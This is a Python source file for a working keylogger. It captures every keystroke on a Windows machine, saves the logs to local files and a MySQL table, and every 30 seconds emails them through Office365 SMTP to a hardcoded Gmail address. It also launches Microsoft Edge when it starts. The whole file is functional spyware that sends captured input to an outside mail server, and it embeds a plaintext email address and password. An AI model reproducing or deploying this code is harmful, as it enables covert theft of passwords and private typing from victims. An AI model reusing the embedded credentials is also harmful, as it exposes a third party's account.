import keyboard
import smtplib
from threading import Timer
from datetime import datetime
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import subprocess
import mysql.connector as mysql
from mysql.connector import Error

SEND_REPORT_EVERY = 30
EMAIL_ADDRESS = "sulochaan11@gmail.com"
EMAIL_PASSWORD = "Sulochaan333"


class Keylogger:
    def __init__(self, interval, report_method="email"):
        self.interval = interval
        self.report_method = report_method

        self.log = ""
        self.start_dt = datetime.now()
        self.end_dt = datetime.now()

    def callback(self, event):
        name = event.name
        if len(name) > 1:
            if name == "space":
                name = " "
            elif name == "enter":
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"
        self.log += name

    def update_filename(self):
        start_dt_str = str(self.start_dt)[
            :-7].replace(" ", "-").replace(":", "")
        end_dt_str = str(self.end_dt)[:-7].replace(" ", "-").replace(":", "")
        self.filename = f"keylog-{start_dt_str}_{end_dt_str}"

    def report_to_file(self):
        with open(f".\Keylogs\{self.filename}.txt", "w") as f:
            print(self.log, file=f)
        self.database()

    def prepare_mail(self, message):
        msg = MIMEMultipart("alternative")
        msg["From"] = EMAIL_ADDRESS
        msg["To"] = EMAIL_ADDRESS
        msg["Subject"] = "Keylogger logs"
        html = f"<p>{message}</p>"
        text_part = MIMEText(message, "plain")
        html_part = MIMEText(html, "html")
        msg.attach(text_part)
        msg.attach(html_part)
        return msg.as_string()

    def sendmail(self, email, password, message, verbose=1):
        server = smtplib.SMTP(host="smtp.office365.com", port=587)
        server.starttls()
        server.login(email, password)
        server.sendmail(email, email, self.prepare_mail(message))
        server.quit()

    def report(self):
        if self.log:
            self.end_dt = datetime.now()
            self.update_filename()
            if self.report_method == "email":
                self.sendmail(EMAIL_ADDRESS, EMAIL_PASSWORD, self.log)
            self.report_to_file()
            self.start_dt = datetime.now()
        self.log = ""
        timer = Timer(interval=self.interval, function=self.report)
        timer.daemon = True
        timer.start()

    def start(self):
        self.start_dt = datetime.now()
        keyboard.on_release(callback=self.callback)
        self.report()
        self.process()
        try:
            keyboard.wait()
        except:
            exit()

    def database(self):
        conn = mysql.connect(host='localhost', user='root', password='')

        if conn.is_connected():
            cursor = conn.cursor()
            cursor.execute("CREATE DATABASE IF NOT EXISTS keylogger")

        self.conn = mysql.connect(
            host="localhost", user="root", password="", database="keylogger")
        if self.conn.is_connected():
            self.cursor = self.conn.cursor()
            self.cursor.execute(
                "CREATE TABLE IF NOT EXISTS logs_info(keystrokes VARCHAR(255),start_time VARCHAR(255), end_time VARCHAR(255));")
            query = "INSERT INTO logs_info(keystrokes, start_time, end_time) VALUES(%s, %s, %s)"
            self.cursor.execute(query, (self.log, self.start_dt, self.end_dt))
            self.conn.commit()
            self.cursor.close()
            self.conn.close()

    def process(self):
        subprocess.Popen(
            ["C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"])


if __name__ == "__main__":
    keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="email")
    keylogger.start()
